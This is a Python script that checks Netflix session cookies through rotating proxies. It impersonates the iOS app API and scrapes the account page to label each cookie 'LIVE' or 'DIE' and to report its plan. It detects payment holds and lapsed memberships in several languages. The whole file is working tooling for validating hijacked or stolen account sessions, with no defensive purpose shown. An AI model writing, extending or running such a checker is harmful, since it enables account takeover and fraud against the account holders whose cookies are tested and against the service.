import requests
import time
import json
import re
import proxies_list

NETFLIX_API_URL = "https://ios.prod.ftl.netflix.com/nq/mobile/nqios/~15.48.0/user"

# Global flag: once we know API is dead, skip it entirely to save time
_api_is_dead = False

PAYMENT_DIE_KEYWORDS = [
    "paymentupdate", "payment-update", "billing-update",
    "your account is on hold", "membership is on hold", "account is on hold",
    "reactivar la suscripción", "reactivar tu suscripción", "reactivar suscripción",
    "cập nhật thanh toán", "tài khoản bị tạm hoãn", "tài khoản bị tạm dừng",
    "zaktualizuj metodę płatności", "restart your membership", "update your payment",
    "update your billing information", "update billing", "we were unable to process your payment",
    "actualiza tu información de pago", "actualiza tu thông tin de pago",
    "atualize sua forma de pagamento", "renovar assinatura", "reiniciar membresía", "reiniciar membresia",
    "aggiorna i dati di pagamento", "mise à jour de votre mode de paiement", "ödeme bilgilerinizi güncelleyin", 
    "aktualisieren sie ihre zahlungsart", "reaktivera ditt medlemskap", "renouveler votre abonnement",
    "suspension de votre compte", "cuenta suspendida", "payment is required", "thanh toán của bạn", 
    "cập nhật phương thức thanh toán", "membershipstatus\":\"rejoin", "membershipstatus\":\"former_member",
    "membershipstatus\":\"never_member", "ismembershipactive\":false", "finish sign-up", "hoàn tất đăng ký",
    "choose a plan", "choose your plan", "membership paused", "membership is paused",
    "warnuserofpaymentfailure", "ispaymentfailure", "payment_failure", "payment_hold", "paymenthold"
]

def normalize_plan_name(raw_plan_name, fallback_text=""):
    import unicodedata
    
    # 1. Nếu đã trích xuất được plan_name cụ thể từ JSON (e.g. "Premium", "Standard", "Standard with Ads")
    if raw_plan_name and str(raw_plan_name).strip():
        p_clean = unicodedata.normalize('NFKD', str(raw_plan_name).lower()).encode('ASCII', 'ignore').decode('utf-8')
        if any(kw in p_clean for kw in ['ads', 'adverts', 'anuncios', 'pub', 'werbung', 'quang cao', 'reklam', 'reklama']):
            return "Standard with Ads"
        elif any(kw in p_clean for kw in ['premium', 'ultra', '4k', '4-screen']):
            return "Premium"
        elif any(kw in p_clean for kw in ['standard', 'estandar', 'standardowy', 'padrao', 'hd']):
            return "Standard"
        elif any(kw in p_clean for kw in ['basic', 'basico', 'podstawowy']):
            return "Basic"
        return str(raw_plan_name).strip()
        
    # 2. Fallback: Chỉ tìm trong các cụm từ gói cước chính xác
    if fallback_text:
        text = unicodedata.normalize('NFKD', str(fallback_text).lower()).encode('ASCII', 'ignore').decode('utf-8')
        if any(kw in text for kw in ['"standard with ads"', '"standard_ads"', 'standard with ads', 'standard con anuncios', 'standard z reklamami']):
            return "Standard with Ads"
        elif any(kw in text for kw in ['"premium"', 'plan: premium', 'premium plan', 'ultra hd', '4k uhd']):
            return "Premium"
        elif any(kw in text for kw in ['"standard"', 'plan: standard', 'standard plan', 'standardowy']):
            return "Standard"
        elif any(kw in text for kw in ['"basic"', 'plan: basic', 'podstawowy']):
            return "Basic"
            
    return "Premium"

def check_web_account_status_and_plan(cookies, proxy_dict):
    """
    Returns (status, plan) where status is 'LIVE', 'DIE', or 'ERROR'.
    Thoroughly checks URL redirects and full HTML body for Payment Holds & Dead accounts.
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://www.netflix.com/YourAccount",
            cookies=cookies,
            headers=headers,
            proxies=proxy_dict,
            allow_redirects=True,
            timeout=15
        )
        url_lower = response.url.lower()
        html = response.text
        text_lower = html.lower()
        
        # 1. Chuyển hướng về Login, ClearCookies, hoặc Signup -> DIE (Cookie hết hạn)
        if "netflix.com/login" in url_lower or "/clearcookies" in url_lower or "/signup" in url_lower:
            return "DIE", None
            
        # 2. URL chứa trang cập nhật thanh toán -> DIE (Lỗi Payment)
        if any(kw in url_lower for kw in ["paymentupdate", "payment-update", "billing-update", "simplemember"]):
            return "DIE", None
            
        # 3. Nội dung HTML chứa thông báo lỗi thanh toán / tạm hoãn / hết hạn -> DIE
        if any(kw in text_lower for kw in PAYMENT_DIE_KEYWORDS):
            return "DIE", None
            
        # 4. Kiểm tra gói cước nếu còn sống (LIVE)
        plan_raw = None
        plan_m = re.search(r'(?:localizedPlanName|planName)"\s*:\s*\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_m:
            plan_raw = plan_m.group(1).replace(r'\x20', ' ').strip()
            try:
                import codecs
                plan_raw = codecs.decode(plan_raw, 'unicode_escape')
            except Exception:
                pass
                
        final_plan = normalize_plan_name(plan_raw, text_lower)
        return "LIVE", final_plan
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR", None
    except Exception as e:
        print(f"Web Check Error: {e}")
        return "ERROR", None

def check_account_live(netflix_id, secure_netflix_id="", check_payment=True):
    """
    Kiem tra toan dien ca Token API va Web HTML.
    Chi tra ve LIVE khi tai khoan thuc su tao duoc Token VA khong bi loi thanh toan.
    """
    cookies = {"NetflixId": netflix_id}
    if secure_netflix_id:
        cookies["SecureNetflixId"] = secure_netflix_id
    
    proxy_dict = proxies_list.get_random_proxy()
    
    # 1. Kiem tra kha nang tao Token dang nhap truc tiep
    plan_api = _get_token_and_plan_api(netflix_id, secure_netflix_id, proxy_dict)
    if plan_api is None:
        return "DIE", None
    elif plan_api == "ERROR":
        # Thu kiem tra qua Web neu API bi loi mang/proxy
        web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
        return web_status, web_plan
        
    # 2. Kiem tra trang Web YourAccount de tranh loi Payment Hold
    if check_payment:
        web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
        if web_status == "DIE":
            return "DIE", None
        elif web_status == "LIVE":
            final_plan = web_plan if web_plan else (plan_api if plan_api != "VALID" else "Premium")
            return "LIVE", final_plan
            
    return "LIVE", plan_api if plan_api != "VALID" else "Premium"


def _get_token_and_plan_api(netflix_id, secure_netflix_id="", proxy_dict=None):
    params = {
        "falcor_server": "0.1.0",
        "withSize": "true",
        "materialize": "true",
        "path": '["account","token","default"]',
        "original_path": "/nq/mobile/nqios/~15.48.0/user"
    }
    cookie_str = f"NetflixId={netflix_id}"
    if secure_netflix_id:
        cookie_str += f"; SecureNetflixId={secure_netflix_id}"

    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "Cookie": cookie_str,
        "x-netflix.client.type": "argo",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.request.routing.original.path": "/nq/mobile/nqios/~15.48.0/user",
        "accept-language": "en-US;q=1"
    }
    try:
        response = requests.get(
            NETFLIX_API_URL,
            params=params,
            headers=headers,
            proxies=proxy_dict,
            timeout=15,
            verify=False
        )
        if response.status_code == 404:
            return "API_DEAD"
        if response.status_code in [403, 429] or response.status_code >= 500:
            return "ERROR"
        if not response.ok:
            return None
        data = response.json()
        data_str = json.dumps(data).lower()
        exact_die_indicators = [
            "\"on_hold\"", "\"canceled\"", "\"former_member\"", "\"never_member\"",
            "\"cancelled\"", "\"delinquent\"", "\"status\":\"hold\"", "\"status\":\"inactive\"",
            "\"payment_failure\"", "\"warnuserofpaymentfailure\":true", "\"ispaymentfailure\":true",
            "\"payment_update\"", "\"paymenterror\"", "\"account_on_hold\"", "\"hold_payment\"",
            "\"membershipstatus\":\"anonymous\"", "\"membershipstatus\":\"former_member\"",
            "\"membershipstatus\":\"never_member\"", "\"ismembershipactive\":false"
        ]
        for indicator in exact_die_indicators:
            if indicator in data_str:
                return None
        token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        if isinstance(token_data, dict):
            token = token_data.get("token")
        elif isinstance(token_data, str):
            token = token_data
        else:
            token = None
            
        if not token:
            return None
            
        return normalize_plan_name("", data_str)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR"
    except Exception as e:
        print(f"Token API error: {e}")
        return "ERROR"
